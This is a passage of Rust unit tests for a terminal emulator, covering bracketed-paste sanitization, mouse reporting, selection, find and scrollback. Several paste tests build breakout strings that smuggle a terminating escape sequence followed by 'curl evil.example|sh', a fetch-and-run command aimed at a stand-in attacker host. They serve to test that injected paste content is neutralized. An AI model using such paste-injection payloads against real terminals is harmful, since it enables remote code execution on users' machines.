        assert_eq!(handle_paste("x", false, &tx), PasteEnqueueResult::Queued);
        assert_eq!(rx.try_recv().expect("raw"), b"x");
    }

    #[test]
    fn normalize_paste_strips_nested_bracket_layers() {
        let double = "\x1b[200~\x1b[200~hello\x1b[201~\x1b[201~";
        assert_eq!(normalize_paste_text(double), "hello");
        let single = "\x1b[200~hello\x1b[201~";
        assert_eq!(normalize_paste_text(single), "hello");
        assert_eq!(normalize_paste_text("plain"), "plain");
        // concatenated dual wraps (not nested) still peel cleanly.
        let concat = "\x1b[200~aa\x1b[201~\x1b[200~bb\x1b[201~";
        assert_eq!(normalize_paste_text(concat), "aabb");
    }

    #[test]
    fn paste_does_not_double_wrap_nested_host_brackets() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        // Simulates Event::Paste after crossterm stripped only the outer host layer.
        let nested = "\x1b[200~printf hi\x1b[201~";
        assert_eq!(handle_paste(nested, true, &tx), PasteEnqueueResult::Queued);
        let bytes = rx.try_recv().expect("paste");
        let s = String::from_utf8_lossy(&bytes);
        // Exactly one wrap layer around clean text.
        assert_eq!(s, "\x1b[200~printf hi\x1b[201~");
        assert_eq!(
            s.matches("\x1b[200~").count(),
            1,
            "must not double-wrap: {s:?}"
        );
    }

    /// Exact-head review: single-pass strip must not synthesize a live 201~.
    #[test]
    fn normalize_paste_fixed_point_no_synthesized_terminator() {
        // Fragments: ESC[20 + END + 1~  → one-pass replace would yield ESC[201~
        let crafted = "\x1b[20\x1b[201~1~";
        let cleaned = normalize_paste_text(crafted);
        assert!(
            !cleaned.contains("\x1b[201~"),
            "must not synthesize live END from fragments: {cleaned:?}"
        );
        assert!(
            !cleaned.contains("\x1b[200~"),
            "must not leave START: {cleaned:?}"
        );
        // Streaming suffix-pop: middle END skipped → out "\x1b[20", then "1~"
        // rejoins to END and is popped → "".
        assert_eq!(cleaned, "");
        assert_eq!(normalize_paste_text("\x1b[20\x1b[201~1~safe"), "safe");
        // Direct embedded END still stripped without eating surrounding text.
        assert_eq!(normalize_paste_text("ab\x1b[201~cd"), "abcd");
    }

    /// Review: depth-N rejoin must stay linear (no fixed-point replace DoS).
    ///
    /// Crafted payload makes naive multi-pass `replace` need `depth` full-string
    /// scans (~O(n²)). Streaming suffix-pop is O(n); depth=20_000 (~120KB) must
    /// finish well under a second on CI.
    #[test]
    fn normalize_paste_deep_nesting_is_linear_bounded() {
        let p = "\x1b[20";
        let q = "1~";
        let end = "\x1b[201~";
        let depth = 20_000;
        let crafted = p.repeat(depth) + end + &q.repeat(depth);
        let start = std::time::Instant::now();
        let cleaned = normalize_paste_text(&crafted);
        let elapsed = start.elapsed();
        assert!(
            !cleaned.contains("\x1b[201~"),
            "must not leave live END after deep rejoin: {cleaned:?}"
        );
        assert!(
            !cleaned.contains("\x1b[200~"),
            "must not leave live START after deep rejoin: {cleaned:?}"
        );
        assert_eq!(cleaned, "", "depth-N P*END*Q* must collapse to empty");
        assert!(
            elapsed.as_secs_f64() < 1.0,
            "normalize must stay linear; took {elapsed:?} for depth={depth}"
        );
    }

    #[test]
    fn normalize_paste_neutralizes_embedded_bracket_delimiters() {
        let breakout = "safe\x1b[201~\ncurl evil.example|sh";
        let cleaned = normalize_paste_text(breakout);
        assert!(
            !cleaned.contains("\x1b[201~"),
            "embedded end delimiter must be stripped: {cleaned:?}"
        );
        assert!(
            !cleaned.contains("\x1b[200~"),
            "embedded start delimiter must be stripped: {cleaned:?}"
        );
        assert!(cleaned.contains("safe"));
        assert!(cleaned.contains("curl evil.example|sh"));

        let mid_start = "before\x1b[200~after";
        assert_eq!(normalize_paste_text(mid_start), "beforeafter");
    }

    /// after neutralize, re-wrap is a single outer layer only.
    #[test]
    fn paste_embedded_201_does_not_appear_live_after_wrap() {
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let breakout = "safe\x1b[201~\ncurl evil|sh";
        handle_paste(breakout, true, &tx);
        let bytes = rx.try_recv().expect("paste");
        let s = String::from_utf8_lossy(&bytes);
        // Exactly one start and one end (the host wrap), not a mid-payload end.
        assert_eq!(
            s.matches("\x1b[200~").count(),
            1,
            "single wrap start: {s:?}"
        );
        assert_eq!(s.matches("\x1b[201~").count(), 1, "single wrap end: {s:?}");
        assert!(
            s.starts_with("\x1b[200~") && s.ends_with("\x1b[201~"),
            "wrap must be outer only: {s:?}"
        );
        let inner = &s[6..s.len() - 6];
        assert!(
            !inner.contains("\x1b[200~") && !inner.contains("\x1b[201~"),
            "payload interior must be free of delimiters: {inner:?}"
        );
        assert!(inner.contains("safe"));
        assert!(inner.contains("curl evil|sh"));
    }

    /// on alt, Ctrl+C is interrupt even if a stale selection exists.
    #[test]
    fn alt_screen_ctrl_c_forwards_interrupt_despite_selection() {
        let mut emulator = Emulator::new(8, 2, 0);
        let _ = emulator.feed(b"hello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 4);
        selection.finish();
        assert!(selection.range().is_some());
        let _ = emulator.feed(b"\x1b[?1049h");
        assert!(emulator.screen().alt_active());
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        let bytes = rx.try_recv().expect("Ctrl+C must forward on alt");
        assert_eq!(bytes, vec![0x03], "must send ^C to child on alt");
        assert!(
            selection.range().is_none(),
            "stale selection cleared on alt"
        );
        assert!(!mode);
    }

    /// is_copy_chord still true with selection, but handle_host_key on alt
    /// bypasses it — covered above. Mouse gestures on alt must not build a range.
    #[test]
    fn alt_screen_mouse_refuses_selection_gesture() {
        let mut emulator = Emulator::new(8, 2, 0);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let _ = emulator.feed(b"\x1b[?1049h");
        assert!(emulator.screen().alt_active());
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let down = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 1,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        handle_mouse(
            down,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert!(
            selection.range().is_none() && !selection.active,
            "no host selection while alt active"
        );
        let drag = MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 4,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        handle_mouse(
            drag,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert!(selection.range().is_none());
    }

    #[test]
    fn mid_drag_survives_child_output_clear_policy() {
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 3);
        assert!(selection.active);
        assert!(selection.range().is_some());
        assert!(
            !should_clear_selection_on_child_output(&selection, false, true),
            "active drag must not clear on epoch/output"
        );
        selection.finish();
        assert!(
            should_clear_selection_on_child_output(&selection, false, true),
            "finished range clears on epoch"
        );
        selection.clear();
        assert!(
            should_clear_selection_on_child_output(&selection, true, false),
            "keyboard select mode clears on output"
        );
    }

    #[test]
    fn find_chord_semicolon_is_kitty_safe_primary() {
        let semi = KeyEvent::new(
            KeyCode::Char(';'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(is_find_chord(semi));
        let quote = KeyEvent::new(
            KeyCode::Char('\''),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(is_find_chord(quote));
        let dot = KeyEvent::new(
            KeyCode::Char('.'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(is_find_chord(dot));
        // Still accepted if the outer host delivers them:
        assert!(is_find_chord(KeyEvent::new(
            KeyCode::Char('f'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        )));
        assert!(is_find_chord(KeyEvent::new(
            KeyCode::Char('/'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        )));
    }

    #[test]
    fn find_chord_opens_and_enter_finds_match() {
        let mut emulator = Emulator::new(40, 4, 50);
        let _ = emulator.feed(b"alpha\nbeta unique_token gamma\nalpha\n");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        // Prefer Ctrl+Shift+; (Kitty steals Ctrl+Shift+F and often Ctrl+Shift+/).
        let open = KeyEvent::new(
            KeyCode::Char(';'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        assert!(handle_host_key(
            open,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert!(find.active);
        assert!(rx.try_recv().is_err());
        for c in "unique_token".chars() {
            let k = KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE);
            handle_host_key(
                k,
                &mut selection,
                &mut mode,
                &mut view_scroll,
                &mut find,
                &emulator,
                &tx,
            )
            .unwrap();
        }
        assert!(
            selection.range().is_some(),
            "typing query should select first match"
        );
        let esc = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        handle_host_key(
            esc,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .unwrap();
        assert!(!find.active);
    }

    #[test]
    fn find_is_case_insensitive_and_shift_enter_goes_prev() {
        let mut emulator = Emulator::new(40, 5, 50);
        let _ = emulator.feed(b"Foo\nbar\nFOO\n");
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let open = KeyEvent::new(
            KeyCode::Char(';'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        handle_host_key(
            open,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .unwrap();
        for c in "foo".chars() {
            handle_host_key(
                KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE),
                &mut selection,
                &mut mode,
                &mut view_scroll,
                &mut find,
                &emulator,
                &tx,
            )
            .unwrap();
        }
        let first = find.last.expect("first ci match");
        assert_eq!(find.rank, Some((1, 2)), "first of two case-insensitive");
        // Enter → next (later FOO).
        handle_host_key(
            KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE),
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .unwrap();
        let second = find.last.expect("second");
        assert!(
            (second.abs_row, second.start_col) > (first.abs_row, first.start_col),
            "Enter advances"
        );
        assert_eq!(find.rank, Some((2, 2)));
        // Shift+Enter → previous.
        handle_host_key(
            KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT),
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .unwrap();
        let back = find.last.expect("prev");
        assert_eq!(
            (back.abs_row, back.start_col),
            (first.abs_row, first.start_col)
        );
        assert_eq!(find.rank, Some((1, 2)));
    }

    #[test]
    fn ctrl_shift_up_scrolls_one_line() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Up, KeyModifiers::SHIFT | KeyModifiers::CONTROL);
        assert!(handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert_eq!(view_scroll, 1);
        assert!(rx.try_recv().is_err());
    }

    #[test]
    fn shift_home_end_jump_scrollback_extremes() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let max = emulator.screen().max_view_scroll();
        assert!(max > 0);
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let home = KeyEvent::new(KeyCode::Home, KeyModifiers::SHIFT);
        assert!(handle_host_key(
            home,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert_eq!(view_scroll, max);
        assert!(rx.try_recv().is_err());
        let end = KeyEvent::new(KeyCode::End, KeyModifiers::SHIFT);
        assert!(handle_host_key(
            end,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert_eq!(view_scroll, 0);
    }

    /// Shift+PageUp pans host scrollback; bare PageUp still reaches child.
    #[test]
    fn shift_pageup_scrolls_view_when_scrollback_exists() {
        let mut emulator = Emulator::new(8, 3, 100);
        for i in 0..12 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        assert!(
            emulator.screen().max_view_scroll() > 0,
            "need history to scroll"
        );
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::PageUp, KeyModifiers::SHIFT);
        let paint = handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(paint);
        assert!(view_scroll > 0, "Shift+PageUp must raise view_scroll");
        assert!(
            rx.try_recv().is_err(),
            "must not forward Shift+PageUp to child"
        );

        let down = KeyEvent::new(KeyCode::PageDown, KeyModifiers::SHIFT);
        handle_host_key(
            down,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        // One page down from a full page up may hit 0 or a smaller offset.
        let bare = KeyEvent::new(KeyCode::PageUp, KeyModifiers::NONE);
        let before = view_scroll;
        handle_host_key(
            bare,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        // Bare PageUp jumps to live (typing path) then forwards — view_scroll cleared.
        assert_eq!(
            view_scroll, 0,
            "non-scroll key while scrolled jumps to live"
        );
        assert!(
            before == 0 || rx.try_recv().is_ok(),
            "bare PageUp should reach child after jump-to-live"
        );
    }

    #[test]
    fn mouse_drag_selects_while_scrolled() {
        let mut emulator = Emulator::new(8, 3, 100);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        for i in 0..12 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = emulator.screen().max_view_scroll().min(6);
        assert!(view_scroll > 0);
        handle_mouse(
            left_down(0, 0),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        handle_mouse(
            left_drag(4, 0),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        handle_mouse(
            MouseEvent {
                kind: MouseEventKind::Up(MouseButton::Left),
                column: 4,
                row: 0,
                modifiers: KeyModifiers::NONE,
            },
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        let range = selection.range().expect("range while scrolled");
        // Absolute history row (not viewport 0).
        assert!(range.start_row < emulator.screen().history_line_count());
        let text = emulator.screen().extract_text_abs(range);
        assert!(
            !text.is_empty(),
            "copy payload from history view must be non-empty"
        );
    }

    /// Continuous edge pan tick scrolls while the pointer is held still at the top.
    #[test]
    fn edge_pan_tick_scrolls_while_held_at_top() {
        let mut emulator = Emulator::new(8, 4, 100);
        for i in 0..30 {
            let _ = emulator.feed(format!("line{i:02}\n").as_bytes());
        }
        let mut selection = Selection::default();
        selection.begin(emulator.screen().abs_row_at_view(2, 2), 0);
        selection.dragged = true;
        selection.active = true;
        let mut view_scroll = 2usize;
        let mut edge_pan = EdgePanDrag {
            active: true,
            view_row: 0,
            view_col: 0,
            last_tick: None,
            ticks_at_edge: 0,
        };
        assert!(edge_pan.tick(&mut selection, &mut view_scroll, &emulator));
        assert_eq!(view_scroll, 3, "first edge tick uses step 1 (slow ramp)");
        let expected = emulator.screen().abs_row_at_view(view_scroll, 0);
        assert_eq!(selection.cursor.map(|c| c.row), Some(expected));
        // Immediate second tick is rate-limited (~48ms at start of ramp).
        assert!(!edge_pan.tick(&mut selection, &mut view_scroll, &emulator));
    }

    /// Absolute selection survives edge autoscroll without dropping the anchor text.
    #[test]
    fn abs_selection_spans_history_after_edge_autoscroll() {
        let mut emulator = Emulator::new(8, 4, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i:02}\n").as_bytes());
        }
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 2usize;
        handle_mouse(
            left_down(0, 2),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        let anchor_abs = selection.anchor.expect("anchor").row;
        handle_mouse(
            left_drag(0, 0),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        assert!(view_scroll > 2 || selection.cursor.map(|c| c.row) != Some(anchor_abs));
        // Anchor absolute row unchanged after edge pan.
        assert_eq!(selection.anchor.map(|a| a.row), Some(anchor_abs));
        let text = emulator
            .screen()
            .extract_text_abs(selection.range().expect("range"));
        assert!(!text.is_empty());
    }

    #[test]
    fn shift_wheel_pages_scroll_view() {
        let mut emulator = Emulator::new(8, 5, 100);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        for i in 0..40 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let page = emulator.screen().rows().saturating_sub(1).max(1);
        let up = MouseEvent {
            kind: MouseEventKind::ScrollUp,
            column: 0,
            row: 0,
            modifiers: KeyModifiers::SHIFT,
        };
        assert!(handle_mouse(
            up,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap());
        assert!(
            view_scroll >= page,
            "Shift+wheel should page, got {view_scroll} page={page}"
        );
    }

    #[test]
    fn mouse_wheel_scrolls_view() {
        let mut emulator = Emulator::new(8, 3, 100);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        for i in 0..12 {
            let _ = emulator.feed(format!("line{i}\n").as_bytes());
        }
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let up = MouseEvent {
            kind: MouseEventKind::ScrollUp,
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        assert!(handle_mouse(
            up,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap());
        assert!(view_scroll >= 3);
        let down = MouseEvent {
            kind: MouseEventKind::ScrollDown,
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        let after_up = view_scroll;
        handle_mouse(
            down,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        assert!(
            view_scroll < after_up || after_up == 0,
            "ScrollDown should reduce offset"
        );
    }

    /// Ctrl+Space one-cell mark must not steal Ctrl+C interrupt.
    #[test]
    fn ctrl_space_one_cell_mark_ctrl_c_forwards_interrupt() {
        let mut emulator = Emulator::new(8, 1, 0);
        let _ = emulator.feed(b"hello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let mark = KeyEvent::new(KeyCode::Char(' '), KeyModifiers::CONTROL);
        assert!(handle_host_key(
            mark,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx
        )
        .unwrap());
        assert!(mode);
        assert!(selection.range().is_some(), "mark is paintable");
        assert!(
            !selection_claims_ctrl_c(&selection),
            "one-cell mark must not claim Ctrl+C"
        );
        let ctrl_c = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        handle_host_key(
            ctrl_c,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        let bytes = rx
            .try_recv()
            .expect("Ctrl+C must forward after one-cell mark");
        assert_eq!(bytes, vec![0x03], "must send ^C to child");
    }

    /// multi-cell selection still claims Ctrl+C as copy (no ^C forward).
    #[test]
    fn multi_cell_selection_ctrl_c_still_copies_not_interrupt() {
        let mut emulator = Emulator::new(8, 1, 0);
        let _ = emulator.feed(b"hello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        selection.begin(0, 0);
        selection.update(0, 4);
        selection.finish();
        assert!(selection_claims_ctrl_c(&selection));
        let mut mode = false;
        let mut view_scroll = 0usize;
        let mut find = FindMode::default();
        let key = KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL);
        handle_host_key(
            key,
            &mut selection,
            &mut mode,
            &mut view_scroll,
            &mut find,
            &emulator,
            &tx,
        )
        .expect("ok");
        assert!(
            rx.try_recv().is_err(),
            "Ctrl+C with multi-cell selection must not send ^C"
        );
    }

    /// left mouse gesture clears keyboard_select_mode.
    #[test]
    fn mouse_down_clears_keyboard_select_mode() {
        let emulator = Emulator::new(8, 2, 0);
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        // Simulate Ctrl+Space mark: one-cell paintable + select mode.
        selection.begin(0, 2);
        selection.dragged = true;
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = true;
        let mut view_scroll = 0usize;
        let down = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 1,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        handle_mouse(
            down,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert!(!mode, "mouse down must leave keyboard_select_mode");
        // Fresh single-click begin: not yet dragged until move.
        assert!(!selection.dragged || selection.active);
    }

    /// mouse input: SGR left-down at (col=2,row=0) → CSI < 0 ; 3 ; 1 M (1-based).
    #[test]
    fn encode_mouse_report_sgr_left_down() {
        let mut emulator = Emulator::new(80, 24, 0);
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1006h");
        let ev = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 2,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        let bytes = encode_mouse_report(ev, &emulator).expect("report");
        assert_eq!(bytes, b"\x1b[<0;3;1M");
    }

    #[test]
    fn encode_mouse_report_sgr_release_and_wheel() {
        let mut emulator = Emulator::new(40, 10, 0);
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1006h");
        let up = MouseEvent {
            kind: MouseEventKind::Up(MouseButton::Left),
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        assert_eq!(encode_mouse_report(up, &emulator).unwrap(), b"\x1b[<0;1;1m");
        let wheel = MouseEvent {
            kind: MouseEventKind::ScrollUp,
            column: 5,
            row: 2,
            modifiers: KeyModifiers::NONE,
        };
        assert_eq!(
            encode_mouse_report(wheel, &emulator).unwrap(),
            b"\x1b[<64;6;3M"
        );
    }

    #[test]
    fn encode_mouse_report_drag_requires_1002() {
        let mut emulator = Emulator::new(40, 10, 0);
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1006h");
        let drag = MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 4,
            row: 1,
            modifiers: KeyModifiers::NONE,
        };
        assert!(
            encode_mouse_report(drag, &emulator).is_none(),
            "click-only level must not report drag"
        );
        let _ = emulator.feed(b"\x1b[?1002h");
        let bytes = encode_mouse_report(drag, &emulator).expect("drag under 1002");
        // motion + left = 0+32 = 32
        assert_eq!(bytes, b"\x1b[<32;5;2M");
    }

    #[test]
    fn encode_mouse_report_x10_when_sgr_off() {
        let mut emulator = Emulator::new(40, 10, 0);
        let _ = emulator.feed(b"\x1b[?1000h");
        assert!(!emulator.mouse_sgr());
        let ev = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        };
        let bytes = encode_mouse_report(ev, &emulator).unwrap();
        // ESC [ M (0+32) (1+32) (1+32)
        assert_eq!(bytes, vec![0x1b, b'[', b'M', 32, 33, 33]);
    }

    /// mouse input hybrid: tracking on + plain click → child SGR, no host selection.
    #[test]
    fn hybrid_plain_click_forwards_sgr_not_selection() {
        let mut emulator = Emulator::new(20, 5, 0);
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1002h\x1b[?1006h");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        handle_mouse(
            left_down(3, 1),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert!(
            selection.range().is_none() && !selection.active,
            "plain app mouse must not build host selection"
        );
        let bytes = rx.try_recv().expect("SGR report queued");
        assert_eq!(&*bytes, b"\x1b[<0;4;2M");
    }

    /// mouse input hybrid: Shift+drag while tracking on → host selection, no report.
    #[test]
    fn hybrid_shift_drag_selects_host_not_app() {
        let mut emulator = Emulator::new(20, 5, 0);
        let _ = emulator.feed(b"\x1b[?1000h\x1b[?1002h\x1b[?1006hhello");
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        let down = MouseEvent {
            kind: MouseEventKind::Down(MouseButton::Left),
            column: 0,
            row: 0,
            modifiers: KeyModifiers::SHIFT,
        };
        let drag = MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column: 4,
            row: 0,
            modifiers: KeyModifiers::SHIFT,
        };
        handle_mouse(
            down,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("down");
        handle_mouse(
            drag,
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("drag");
        assert!(
            selection.range().is_some(),
            "Shift+drag must host-select while app mouse on"
        );
        assert!(
            rx.try_recv().is_err(),
            "Shift path must not emit app mouse report"
        );
    }

    /// mouse input: alt + tracking + plain → SGR to child (vim path).
    #[test]
    fn hybrid_alt_plain_click_forwards_sgr() {
        let mut emulator = Emulator::new(20, 5, 0);
        let _ = emulator.feed(b"\x1b[?1049h\x1b[?1000h\x1b[?1006h");
        assert!(emulator.screen().alt_active());
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 0usize;
        handle_mouse(
            left_down(1, 0),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .expect("ok");
        assert!(selection.range().is_none());
        let bytes = rx.try_recv().expect("SGR on alt");
        assert_eq!(&*bytes, b"\x1b[<0;2;1M");
    }

    // follow-up: drag at top edge while scrolled pans history and keeps
    /// the selection free end on the pointer row.
    #[test]
    fn drag_at_top_edge_autoscrolls_history() {
        let mut emulator = Emulator::new(8, 4, 100);
        for i in 0..20 {
            let _ = emulator.feed(format!("line{i:02}\n").as_bytes());
        }
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(4);
        let mut selection = Selection::default();
        let mut multi = MultiClick::default();
        let mut edge_pan = EdgePanDrag::default();
        let mut mode = false;
        let mut view_scroll = 2usize; // some history above
        assert!(view_scroll < emulator.screen().max_view_scroll());

        handle_mouse(
            left_down(0, 2),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        handle_mouse(
            left_drag(0, 2),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        assert_eq!(view_scroll, 2, "mid-viewport drag must not pan");

        let before = view_scroll;
        handle_mouse(
            left_drag(0, 0),
            &mut selection,
            &mut multi,
            &mut mode,
            &mut view_scroll,
            &emulator,
            &tx,
            &mut edge_pan,
        )
        .unwrap();
        assert!(
